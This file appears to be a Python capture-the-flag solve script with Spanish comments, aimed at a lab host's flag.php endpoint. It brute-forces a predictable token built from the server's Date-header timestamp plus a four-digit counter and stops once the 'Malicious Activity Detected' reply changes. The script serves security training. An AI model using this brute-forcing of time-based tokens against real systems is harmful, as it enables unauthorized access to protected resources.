import requests, time
from datetime import datetime, timezone

def fecha_numeros(server_time):
    try:
        # Convertir el encabezado Date (GMT) a un objeto datetime en UTC
        server_time_utc = datetime.strptime(server_time, '%a, %d %b %Y %H:%M:%S GMT')
        server_time_utc = server_time_utc.replace(tzinfo=timezone.utc)

        # Convertir a un timestamp (segundos desde la época Unix)
        timestamp = int(server_time_utc.timestamp())
    except ValueError:
        timestamp = None  # Si hay un error en la conversión, establecer el timestamp como None
    return timestamp

def llamadaURL(session, token):
    # Cambiar el token en la URL
    url = "http://10.0.160.47/app/flag.php?token="+token
    
    # Hacer una solicitud GET usando las cookies obtenidas y el nuevo token
    response = session.get(url)

    return response

url_Base ='http://10.0.160.47/app/flag.php?token=a'

# Crear una sesión
session = requests.Session()

response = session.get(url_Base)

cookies = session.cookies.get_dict()

# Obtener la hora del servidor desde los encabezados de la respuesta
server_time = response.headers.get('Date', 'No se encontró la hora del servidor')
server_time = fecha_numeros(server_time)
print(server_time)


for i in range(1000, 10000):
	print("--------")
	token = str(server_time)+str(i)
	print("Token: "+ token)
	respuesta = str((llamadaURL(session, token)).text)
	print("Respuesta:",(respuesta))
	if (respuesta != "Malicious Activity Detected.\n"):
		print("Rompiendo el hielo")
		break
	print(" ")